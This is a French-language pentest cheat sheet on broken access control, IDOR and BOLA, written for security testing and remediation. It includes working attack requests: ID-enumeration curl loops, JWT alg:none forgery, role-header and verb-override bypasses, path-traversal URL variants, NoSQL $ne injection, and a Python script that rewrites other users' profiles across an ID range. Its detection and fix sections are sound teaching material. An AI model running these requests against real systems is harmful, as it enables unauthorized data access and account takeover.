---
title: "IDOR & BOLA - Insecure Direct Object References"
description: "Analyse approfondie de la vulnérabilité IDOR/BOLA : mécanismes, exploitation web/API, détection et remédiation."
tags:
  - web
  - api
  - idor
  - bola
  - access-control
  - owasp
  - rbac
  - abac
  - graphql
  - jwt
  - http-verb-tampering
  - hpp
---

# Broken Access Control — fiche de triche terrain

!!! warning "Cadre légal"
    Ces techniques ne doivent être mises en œuvre que dans un cadre légal explicite : laboratoire, CTF, ou test d'intrusion couvert par une autorisation écrite.

---

## 1. Exploitation IDOR (Insecure Direct Object References)

| Type | Principe | Exemple |
|---|---|---|
| **IDOR horizontal** | Accès aux données d'un autre utilisateur de même niveau de privilège | Voir la facture du client 1002 en étant le client 1001 |
| **IDOR vertical** | Accès à des fonctionnalités réservées à un niveau de privilège supérieur | Utilisateur standard accédant à une ressource réservée aux admins |

```bash
curl -H "Cookie: session=user1001" https://cible.com/api/invoice/1001    # Requête légitime
curl -H "Cookie: session=user1001" https://cible.com/api/invoice/1002    # Test IDOR horizontal
```

```bash
for id in $(seq 1000 1100); do
  curl -s -H "Cookie: session=user1001" "https://cible.com/api/invoice/$id" \
    -o "invoice_${id}.json" -w "ID %{id} : %{http_code}\n"
done
# Énumère une plage d'ID pour identifier les ressources accessibles sans contrôle d'appartenance
```

### Prédictibilité des paramètres

| Format d'identifiant | Prédictibilité | Exemple |
|---|---|---|
| ID séquentiel entier | Élevée | `?id=1042` → `?id=1043` trivialement devinable |
| UUID v4 (aléatoire) | Très faible | `?id=3f2b1c8e-...` — 122 bits d'entropie effective |
| UUID v1 (basé timestamp/MAC) | Modérée | Contient des informations temporelles partiellement déductibles |
| Hash court non salé | Variable | Brute-forçable si l'espace de valeurs sources est restreint |

!!! tip "UUID n'est pas une garantie de sécurité en soi"
    Un UUID rend l'énumération séquentielle impraticable, mais ne remplace jamais un contrôle d'autorisation côté serveur : un UUID divulgué (log, URL partagée, referer) reste directement exploitable sans aucune protection supplémentaire.

!!! warning "Contrôle d'accès manquant = vulnérabilité, quel que soit le format d'ID"
    Le véritable défaut n'est pas la prévisibilité de l'identifiant mais l'absence de vérification que l'utilisateur authentifié est bien autorisé à accéder à la ressource demandée.

---

## 2. Élévation de privilèges horizontale & verticale

### Manipulation du corps de requête

```json
// Requête légitime d'inscription
{ "username": "test", "email": "test@mail.com", "role": "user" }
```

```json
// Requête modifiée : injection d'un champ non prévu par l'interface visible
{ "username": "test", "email": "test@mail.com", "role": "admin" }
```

!!! warning "Mass assignment"
    Si le backend associe automatiquement chaque champ JSON reçu à un attribut du modèle utilisateur sans liste blanche explicite, un champ absent du formulaire visible peut néanmoins être accepté et traité par l'API.

### Manipulation d'en-têtes ou cookies

```bash
curl -H "X-User-Role: admin" https://cible.com/api/dashboard
# Teste si un en-tête custom non validé influence la logique d'autorisation

curl -H "Cookie: role=admin; session=abc123" https://cible.com/api/dashboard
# Teste un cookie de rôle manipulable côté client
```

### Manipulation de JWT

```text
Header : { "alg": "HS256", "typ": "JWT" }
Payload : { "user": "test", "role": "user" }
```

```bash
echo '{"user":"test","role":"admin"}' | base64 -w0
# Ré-encode un payload modifié, à réassembler avec le header et une signature (valide si "alg":"none" accepté)
```

| Technique JWT | Principe |
|---|---|
| `alg: none` | Certaines implémentations acceptent une signature vide si l'algorithme est déclaré "none" |
| Confusion RS256 → HS256 | Utilise la clé publique RSA (souvent accessible) comme clé secrète HMAC de signature |
| Absence de vérification de signature | Le serveur décode le payload sans jamais valider la signature associée |

!!! tip "Décoder rapidement un JWT"
    `echo "<partie_payload>" | base64 -d` (ajouter le padding `=` manquant si nécessaire) révèle directement le contenu du payload sans outil dédié.

---

## 3. Contournement de verbes et méthodes HTTP

```bash
curl -X GET https://cible.com/admin/users/1/delete       # Bloqué (403) sur la méthode attendue
curl -X POST https://cible.com/admin/users/1/delete       # Test avec une autre méthode
curl -X PUT https://cible.com/admin/users/1/delete         # Test avec PUT
curl -X DELETE https://cible.com/admin/users/1              # Test avec DELETE explicite sur la ressource
```

```bash
curl -X POST -H "X-HTTP-Method-Override: DELETE" https://cible.com/admin/users/1
# Certains frameworks interprètent cet en-tête pour simuler une méthode non supportée par le client
```

| En-tête d'override | Framework concerné (historique) |
|---|---|
| `X-HTTP-Method-Override` | Rails, Symfony, ASP.NET (selon configuration) |
| `X-HTTP-Method` | Variante moins courante |
| `X-Method-Override` | Variante alternative |
| `_method` (paramètre de formulaire) | Rails, Laravel (override via corps de requête) |

!!! warning "Contrôle d'accès appliqué à une seule méthode"
    Une règle de contrôle d'accès configurée uniquement pour `GET /admin/*` (ex : au niveau reverse-proxy ou middleware) peut laisser passer une requête `POST`/`PUT`/`DELETE` identique en chemin si la règle n'est pas explicitement méthode-agnostique.

---

## 4. Bypass de contrôle d'accès par réécriture d'URL

### En-têtes de proxying

```bash
curl -H "X-Original-URL: /admin/dashboard" https://cible.com/
# Certains reverse-proxy/frameworks routent en interne selon cet en-tête plutôt que le chemin réel de la requête

curl -H "X-Rewrite-URL: /admin/dashboard" https://cible.com/
# Variante équivalente selon l'implémentation du middleware
```

!!! warning "Écart entre couche de filtrage et couche applicative"
    Si le pare-feu applicatif ou le reverse-proxy filtre sur l'URL de la requête HTTP réelle, mais que l'application interne route ensuite selon un en-tête distinct, un contournement complet du contrôle d'accès frontal devient possible.

### Path traversal dans l'URL

```bash
curl https://cible.com/admin/..;/dashboard
# Le point-virgule après ".." peut être interprété comme un séparateur de paramètre matrix par certains serveurs Java/Tomcat, contournant un filtre sur le préfixe "/admin/"

curl https://cible.com/%2e%2e/admin/dashboard
curl https://cible.com/admin%2f..%2fdashboard
# Variantes encodées, à tester si la normalisation d'URL diffère entre la couche de filtrage et le serveur applicatif
```

| Variante de traversée | Cible typique |
|---|---|
| `/admin/..;/dashboard` | Tomcat / serveurs interprétant le point-virgule comme séparateur matrix |
| `/admin/./dashboard` | Filtres ne normalisant pas les segments `.` |
| `/admin//dashboard` | Double slash non normalisé avant comparaison de préfixe |
| `/ADMIN/dashboard` | Comparaison sensible à la casse côté filtre, insensible côté route applicative |

!!! tip "Toujours comparer filtrage et routage réel"
    Ce type de contournement exploite systématiquement un désaccord de normalisation entre deux composants distincts de la chaîne (proxy/WAF vs serveur applicatif). Tester chaque variante d'encodage face à la route protégée reste la seule méthode fiable de détection.

---

## 5. Focus approfondi — IDOR / BOLA

### 5.1 Résumé exécutif & contexte

**IDOR** (*Insecure Direct Object Reference*) et **BOLA** (*Broken Object Level Authorization*) désignent la même famille de défaut : une application expose une référence directe vers un objet interne (ligne de base de données, fichier, ressource) et **traite une requête sur cet objet sans revérifier que l'utilisateur authentifié en est le propriétaire ou dispose des droits requis**.

- **OWASP Top 10 Web (2021)** : classé sous `A01:2021 — Broken Access Control`, catégorie qui regroupe à elle seule la majorité des incidents recensés dans le rapport.
- **OWASP API Security Top 10 (2023)** : classé `API1:2023 — Broken Object Level Authorization`, en tête de liste, car les API REST/GraphQL exposent structurellement des identifiants d'objets dans chaque endpoint (`/api/orders/{id}`, `/api/users/{id}/documents/{doc_id}`, etc.), ce qui démultiplie la surface d'attaque par rapport à une application web monolithique.

!!! danger "Authentification ≠ Autorisation"
    - **Authentification** (*Who you are*) : le serveur vérifie que la requête provient bien d'une identité connue (session valide, JWT signé, clé API valide).
    - **Autorisation** (*What you can do*) : le serveur vérifie que **cette identité précise** a le droit d'effectuer **cette action précise** sur **cet objet précis**.

    Un IDOR/BOLA est presque toujours un défaut de la seconde couche alors que la première fonctionne parfaitement : la victime est un utilisateur légitime, authentifié, qui abuse simplement d'un contrôle d'autorisation absent ou incomplet.

**Impacts métier typiques :**

| Impact | Exemple concret |
|---|---|
| Exfiltration massive de données | Énumération de `?invoice_id=` permettant de télécharger l'intégralité des factures d'un SaaS B2B |
| Modification non autorisée | Changement du mot de passe ou de l'e-mail d'un tiers via `PATCH /api/users/{id}` |
| Élévation horizontale | Un client accède aux données d'un autre client de même rang (même tenant ou tenant différent) |
| Élévation verticale | Un utilisateur standard exécute une action réservée à un rôle admin via un endpoint mal protégé |
| Effet domino RGPD/conformité | Une simple fuite d'IDOR sur des données personnelles déclenche une obligation de notification réglementaire |

---

### 5.2 Mécanisme & fonctionnement interne

Le défaut se situe presque toujours dans la couche de traitement de la requête, **après** l'authentification et **avant** ou **pendant** l'accès aux données :

```text
Requête HTTP → Authentification (OK) → Récupération de l'objet par ID → [ÉTAPE MANQUANTE] → Retour de la réponse
                                                                              ↑
                                                        Vérification que subject == owner(object)
                                                        ou que subject.role permet l'action demandée
```

Concrètement, le code applicatif exécute souvent une requête du type :

```sql
SELECT * FROM invoices WHERE id = :id;
-- au lieu de :
SELECT * FROM invoices WHERE id = :id AND owner_id = :current_user_id;
```

La simple présence d'une clause `WHERE id = :id` sans filtre de propriétaire suffit à rendre l'endpoint vulnérable, quelle que soit la qualité du reste de l'architecture (chiffrement, WAF, authentification forte).

**Pourquoi la possession ou la devinabilité d'un identifiant n'est jamais une preuve d'autorisation :**

- Un identifiant (numérique, UUID, hash) est une **clé de recherche technique**, pas un **jeton de preuve de droit**. Le confondre revient à considérer que connaître le numéro de compte bancaire d'un tiers suffit à en disposer.
- Un identifiant peut être obtenu par un canal totalement hors du contrôle applicatif : URL partagée par e-mail, historique de navigateur, logs de proxy, en-tête `Referer`, réponse d'un autre endpoint moins protégé, ou simple export CSV mal filtré.

**Monolithe (sessions/cookies) vs API stateless (JWT/microservices) :**

| Aspect | Application monolithique | API REST/GraphQL stateless |
|---|---|---|
| État de session | Conservé côté serveur (session store), le contexte utilisateur est recalculé à chaque requête | Le contexte utilisateur est encodé dans le token (JWT) et **doit être revalidé** à chaque appel, y compris inter-services |
| Surface d'exposition | Généralement un seul point d'entrée applicatif | Chaque microservice peut réimplémenter (ou oublier) son propre contrôle d'autorisation |
| Risque spécifique | Oubli d'un contrôle sur une route secondaire (export, impression, backoffice) | Un microservice interne fait confiance à un microservice appelant sans revérifier le contexte utilisateur transmis (confused deputy), ou le token JWT est décodé mais son contenu (`role`, `tenant_id`) n'est jamais recroisé avec l'objet demandé |
| GraphQL en particulier | N/A | Un même `resolver` peut être appelé via plusieurs chemins de requête (query imbriquées, alias multiples) ; un contrôle d'autorisation posé au niveau du endpoint HTTP n'est d'aucune utilité si le contrôle n'est pas répété **au niveau du resolver / du champ** |

!!! warning "Cas classique de microservices : la confiance implicite inter-services"
    Un service front-office authentifie l'utilisateur, extrait `user_id` du JWT, puis appelle un service interne `GET /internal/orders/{order_id}` **sans transmettre ni revérifier** `user_id`. Le service interne, supposant que l'appel provient d'un composant de confiance, retourne l'objet sans filtre de propriétaire. Le BOLA se situe alors dans le service interne, invisible depuis un simple test de la façade publique.

---

### 5.3 Empreinte & détection

#### Reconnaissance et cartographie des paramètres sensibles

Avant tout test, cartographier systématiquement où un identifiant d'objet peut apparaître :

- **URL / path** : `/api/users/1042`, `/documents/{doc_id}/download`
- **Query string** : `?invoice_id=1042`, `?account=1042`
- **Corps JSON** : `{"user_id": 1042}`, `{"target": {"id": 1042}}`
- **En-têtes HTTP custom** : `X-User-Id`, `X-Account-Ref`, `X-Original-User-ID`
- **Paramètres GraphQL** : arguments de `query`/`mutation` (`user(id: "1042")`), variables passées séparément du corps de la requête
- **Cookies** : identifiants de compte ou de session stockés en clair ou faiblement encodés

```bash
# Interception passive : lister tous les paramètres numériques/UUID observés sur une session de navigation
# (utile avant tout test actif, pour construire une liste exhaustive de points d'entrée)
grep -Eo '"[a-zA-Z_]*(id|Id|ID)"\s*:\s*"?[0-9a-fA-F-]+"?' burp_history.json | sort -u
```

#### Typologie des identifiants

| Type | Prédictibilité | Exemple | Remarque |
|---|---|---|---|
| Séquentiel/incrémental | Élevée | `?id=1042` | Énumérable trivialement en itérant sur la plage |
| Encodé Base64/Hex | Faible en apparence, triviale en pratique | `aWQ9MTA0Mg==` → `id=1042` | Le décodage ne change rien à la vulnérabilité sous-jacente, seul l'effort de reconnaissance augmente légèrement |
| Hash non salé (ex : `md5(user_id)`) | Variable, souvent forte si l'espace source est restreint | `md5("1042")` = `hash fixe` | Brute-forçable hors ligne si la plage de `user_id` plausible est connue ou bornée |
| UUIDv1 (timestamp + MAC) | Modérée | Contient un horodatage et un identifiant matériel partiellement reconstructibles | Ne jamais utiliser pour des identifiants sensibles à faire circuler côté client |
| UUIDv4 (aléatoire) | Très faible (122 bits d'entropie) | `3f2b1c8e-...` | Rend l'énumération impraticable mais **ne dispense jamais** du contrôle d'autorisation serveur |

#### Analyse comportementale des réponses HTTP

Le code de statut retourné distingue souvent un IDOR/BOLA "visible" d'un IDOR/BOLA "aveugle" :

| Code retourné pour un objet appartenant à un tiers | Interprétation |
|---|---|
| `200 OK` avec les données du tiers | Vulnérabilité confirmée et directement exploitable |
| `403 Forbidden` | Contrôle d'autorisation présent — comportement attendu |
| `401 Unauthorized` | Généralement un défaut d'authentification, pas un IDOR à proprement parler |
| `404 Not Found` pour un ID existant | Souvent une **fausse négative volontaire** (bonne pratique : ne pas confirmer l'existence de l'objet) — à ne pas confondre avec un ID réellement inexistant |
| `200 OK` avec un corps vide/générique mais code 200 | **IDOR aveugle** : la différence de comportement (temps de réponse, taille de la réponse, présence d'un champ précis) peut tout de même confirmer l'existence de l'objet sans en exposer le contenu |

!!! tip "Différentiel de réponse comme oracle"
    Lorsqu'aucune donnée n'est visible directement, comparer systématiquement : temps de réponse, taille du corps de réponse (octets), présence/absence d'un en-tête `ETag` ou `Content-Length`, et messages d'erreur légèrement différents entre un ID existant appartenant à un tiers et un ID totalement inexistant. Un écart constant et reproductible constitue un oracle exploitable même sans exfiltration directe.

---

### 5.4 Méthodologie d'exploitation & variantes

#### Variante 1 : IDOR classique par manipulation de paramètres d'URL (GET)

```http
GET /api/documents/4471 HTTP/1.1
Host: cible.com
Cookie: session=user_1001_session_token
Accept: application/json
```

```http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "id": 4471,
  "owner_id": 1001,
  "filename": "contrat_confidentiel_2026.pdf",
  "download_url": "/files/4471.pdf"
}
```

Test IDOR : remplacement de l'identifiant par celui d'une ressource appartenant à un autre utilisateur, en conservant la session `user_1001` :

```http
GET /api/documents/4472 HTTP/1.1
Host: cible.com
Cookie: session=user_1001_session_token
Accept: application/json
```

```http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "id": 4472,
  "owner_id": 1002,
  "filename": "bulletin_paie_janvier_2026.pdf",
  "download_url": "/files/4472.pdf"
}
```

!!! danger "Confirmation IDOR"
    Le code `200 OK` renvoyant un objet dont `owner_id` diffère du compte authentifié (`1001`) confirme une absence totale de vérification de propriété côté serveur.

#### Variante 2 : BOLA sur API REST/JSON (POST/PUT/PATCH/DELETE)

Modification du profil d'un tiers via substitution d'identifiant **dans le corps** de la requête plutôt que dans l'URL :

```http
PATCH /api/v2/users/profile HTTP/1.1
Host: cible.com
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
Content-Type: application/json

{
  "target_user_id": 1002,
  "email": "attacker-controlled@mail.com",
  "phone": "+33600000000"
}
```

```http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "status": "updated",
  "user_id": 1002,
  "email": "attacker-controlled@mail.com"
}
```

```python
# Script d'automatisation : parcours d'une plage d'ID pour évaluer l'ampleur d'un BOLA en PATCH
import requests

BASE_URL = "https://cible.com/api/v2/users/profile"
HEADERS = {
    "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
    "Content-Type": "application/json",
}

for target_id in range(1000, 1050):
    payload = {"target_user_id": target_id, "phone": "+33600000000"}
    r = requests.patch(BASE_URL, json=payload, headers=HEADERS, timeout=5)
    print(f"target_user_id={target_id} -> {r.status_code}")
    # Un taux élevé de 200 OK sur des ID hors périmètre du compte authentifié confirme le BOLA
```

#### Variante 3 : Bypasses et contournements courants

**Polymorphisme de type** — envoyer une structure différente de celle attendue par le validateur peut contourner une vérification d'égalité stricte mal implémentée :

```json
// Requête attendue par le validateur
{ "id": 1002 }
```

```json
// Tableau au lieu d'un entier : certains ORMs interprètent le premier élément ou toute la liste
{ "id": [1002] }
```

```json
// Opérateur NoSQL injecté dans un contexte MongoDB : contourne une comparaison stricte
{ "id": { "$ne": 0 } }
```

!!! warning "Injection d'opérateurs NoSQL et contrôle d'accès"
    Si le contrôle d'autorisation repose sur une comparaison `id === expected_id` réalisée côté application **après** une requête MongoDB qui, elle, interprète `{"$ne": 0}` comme "tout document dont l'id est différent de 0", la requête retourne potentiellement le premier document de la collection, indépendamment du propriétaire réel.

**Pollution de paramètres HTTP (HPP)** — envoi du même paramètre en double, dont l'interprétation diverge entre couche de validation et couche de traitement :

```bash
curl -G "https://cible.com/api/invoice" \
  --data-urlencode "id=1001" \
  --data-urlencode "id=1002"
# Certains frameworks/serveurs web ne retiennent que la dernière occurrence (Node/Express),
# d'autres la première (PHP/Apache selon configuration), d'autres encore concaténent les deux
# en tableau — un désaccord entre la couche de contrôle d'accès et la couche de traitement
# métier sur laquelle des deux valeurs est utilisée ouvre une fenêtre de contournement.
```

| Serveur/Framework | Comportement typique sur paramètre dupliqué |
|---|---|
| PHP (Apache/Nginx par défaut) | Retient la **dernière** occurrence |
| Node.js / Express (`qs`) | Retourne un **tableau** des deux valeurs |
| ASP.NET | Concatène les valeurs séparées par une virgule |
| Certains reverse-proxies | Retiennent la **première** occurrence avant transmission au backend |

**Substitution de verbes HTTP non documentés** — cf. section 3 de ce document, directement applicable à un endpoint IDOR/BOLA : tester `GET` sur une route normalement en `POST`, ou `PUT`/`DELETE` non exposés dans la documentation publique mais actifs côté routeur.

**Wrapping d'identifiants dans des en-têtes custom** :

```bash
curl -H "X-Original-User-ID: 1002" \
     -H "X-Forwarded-For: 10.0.0.5" \
     -H "Cookie: session=user_1001_session_token" \
     https://cible.com/api/account/settings
# Teste si un composant interne (cache, proxy applicatif, service de logging) fait
# confiance à un en-tête custom pour déterminer le user_id effectif, au lieu de
# dériver ce contexte exclusivement depuis la session/le token authentifié.
```

**IDOR masqué / de second ordre** — l'identifiant sensible n'est pas directement manipulé, mais référencé indirectement via un autre objet dont l'appartenance n'est, elle, pas vérifiée :

```http
GET /api/invoices/9981/download?format=pdf HTTP/1.1
Host: cible.com
Cookie: session=user_1001_session_token
```

Si `invoice_id=9981` appartient à `user_1002`, mais que le endpoint de téléchargement vérifie uniquement l'existence de la facture (et non son propriétaire) avant de streamer le PDF associé, l'accès non autorisé se produit **sans jamais manipuler directement un identifiant utilisateur** — seul l'identifiant de la ressource dérivée (la facture) est en cause.

---

### 5.5 Remédiation & hardening (perspective Blue Team)

!!! danger "Principe fondamental"
    **Chaque accès à un objet doit revalider explicitement, côté serveur, que le sujet authentifié (`current_user`) est autorisé à effectuer l'action demandée sur cet objet précis** — à chaque requête, sans exception, y compris pour les appels inter-services internes.

**RBAC vs ABAC :**

| Modèle | Principe | Cas d'usage typique |
|---|---|---|
| **RBAC** (*Role-Based Access Control*) | Les permissions sont attachées à un rôle (`admin`, `user`, `support`), lui-même attaché à l'utilisateur | Suffisant lorsque les droits ne dépendent pas de la relation entre l'utilisateur et l'objet précis |
| **ABAC** (*Attribute-Based Access Control*) | Les permissions dépendent d'attributs combinés (rôle **et** propriétaire **et** tenant **et** état de l'objet) | Nécessaire dès qu'il faut répondre à "cet utilisateur a-t-il le droit sur **cet objet précis**", ce qui est le cœur du problème IDOR/BOLA |

Dans la majorité des cas d'IDOR/BOLA, un RBAC seul est insuffisant : un rôle `user` valide l'accès à la fonctionnalité "consulter une facture" en général, mais seul un contrôle ABAC (`facture.owner_id == current_user.id`) empêche l'accès à la facture d'un tiers.

**Remplacement des identifiants directs :**

- Utiliser des références indirectes non devinables (UUIDv4, ou identifiants éphémères liés à la session/au contexte de la requête) réduit la surface d'énumération opportuniste.
- **Cet avertissement doit toujours accompagner une telle recommandation :** un UUID rend l'énumération séquentielle impraticable, mais reste directement exploitable si divulgué (URL partagée, log, `Referer`, export) — **l'obscurité de l'identifiant n'est jamais un substitut au contrôle d'autorisation serveur**, elle ne fait qu'augmenter le coût de reconnaissance pour un attaquant, pas l'éliminer.

**Exemples de code correctif — vérification d'appartenance systématique :**

```python
# Python / Flask — contrôle d'appartenance explicite avant tout accès à l'objet
from flask import Flask, jsonify, abort, g

app = Flask(__name__)

@app.route("/api/invoices/<int:invoice_id>", methods=["GET"])
@require_auth  # décorateur qui peuple g.current_user à partir du token/session
def get_invoice(invoice_id):
    invoice = db.session.execute(
        "SELECT * FROM invoices WHERE id = :id AND owner_id = :owner_id",
        {"id": invoice_id, "owner_id": g.current_user.id},
    ).fetchone()

    if invoice is None:
        # Réponse volontairement identique, que l'objet n'existe pas
        # ou qu'il appartienne à un autre utilisateur : évite de confirmer
        # l'existence de ressources hors périmètre (pas d'oracle 403 vs 404).
        abort(404)

    return jsonify(dict(invoice))
```

```javascript
// Node.js / Express — middleware générique de vérification d'appartenance,
// réutilisable sur l'ensemble des routes exposant un object_id
const requireOwnership = (resourceLoader) => async (req, res, next) => {
  const resource = await resourceLoader(req.params.id);

  if (!resource) {
    return res.status(404).json({ error: "Not found" });
  }
  if (resource.ownerId !== req.currentUser.id && !req.currentUser.roles.includes("admin")) {
    // Même code de statut que "introuvable" pour ne pas fuiter l'existence de l'objet
    return res.status(404).json({ error: "Not found" });
  }

  req.resource = resource;
  next();
};

app.get(
  "/api/documents/:id",
  authenticate,
  requireOwnership((id) => Document.findById(id)),
  (req, res) => res.json(req.resource)
);
```

```php
<?php
// PHP — vérification d'appartenance au niveau de la requête SQL elle-même,
// jamais uniquement en post-traitement applicatif
$stmt = $pdo->prepare(
    "SELECT * FROM documents WHERE id = :id AND owner_id = :owner_id"
);
$stmt->execute([
    ':id' => $requestedId,
    ':owner_id' => $currentUser->id,
]);
$document = $stmt->fetch();

if ($document === false) {
    // 404 générique, quel que soit le motif réel (inexistant ou appartenance à un tiers)
    http_response_code(404);
    exit(json_encode(['error' => 'Not found']));
}
?>
```

**Bonnes pratiques complémentaires :**

- Centraliser la logique d'autorisation dans une couche unique (middleware, décorateur, policy engine type OPA/Casbin) plutôt que de la dupliquer route par route — la duplication est la première cause d'oubli.
- Pour les architectures multi-tenant, inclure systématiquement `tenant_id` dans **chaque** clause de filtrage, y compris les jointures indirectes (cas de l'IDOR de second ordre, section 5.4).
- En environnement microservices, ne jamais faire confiance à un `user_id`/`tenant_id` transmis par un service appelant sans re-signature ou re-vérification cryptographique du contexte (éviter le pattern *confused deputy*).
- Pour GraphQL, appliquer le contrôle d'autorisation **au niveau du resolver**, pas uniquement au niveau du endpoint HTTP, afin de couvrir tous les chemins de requête possibles vers un même champ.
- Journaliser et alerter sur les patterns d'énumération (accès séquentiels rapides à des `id` consécutifs par un même compte) pour détecter une exploitation active avant l'exfiltration complète.
